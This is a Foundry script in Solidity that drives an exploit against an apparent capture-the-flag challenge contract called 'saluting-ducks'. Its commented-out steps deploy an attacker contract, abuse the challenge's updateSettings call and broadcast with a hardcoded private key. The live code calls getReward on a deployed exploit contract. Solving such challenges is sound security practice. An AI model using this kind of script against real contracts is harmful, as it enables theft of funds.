// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import "../src/saluting-ducks/Challenge.sol";
// import "../src/saluting-ducks/Exploitor.sol";
import "../src/saluting-ducks/Exploitor2.sol";


contract ExploitScript is Script {
    function setUp() public {}

    function run() public {
        Challenge challenge = Challenge(
            address(0x72b6EFfE4ee040e5FeFB3894fEf698AE7936D608)
        );

        /// local
        // vm.startBroadcast();
        // Exploit exploitor = new Exploit(address(challenge));
        // challenge.updateSettings(address(exploitor), 1e30, 0);
        // exploitor.init();
        // vm.stopBroadcast();

        // vm.startBroadcast();
        // address payable addr = payable(
        //     address(0x3CEdf1aD30f4DAC57196a3b7Ef4b2F9B0ad536Db)
        // );
        // addr.transfer(1e18);
        // Exploit exploitor = new Exploit(address(challenge));
        // vm.stopBroadcast();

        // vm.startBroadcast(
        //     0x1b0c68f629e4d5bd555352706da5d862fe22f889b9fcdea6edc1a3a6847710a2
        // );
        // challenge.updateSettings(address(exploitor), 1e30, 0);
        // vm.stopBroadcast();

        // vm.startBroadcast();
        // exploitor.init();
        // vm.stopBroadcast();

        Exploit exploitor = Exploit(
            address(0xCdbf925279edF47A52C5b2dC1fD20A9775a9Efb8)
        );
        vm.startBroadcast();
        for (uint256 i = 0; i < 1; i++) {
            exploitor.getReward();
        }
        vm.stopBroadcast();
    }
}
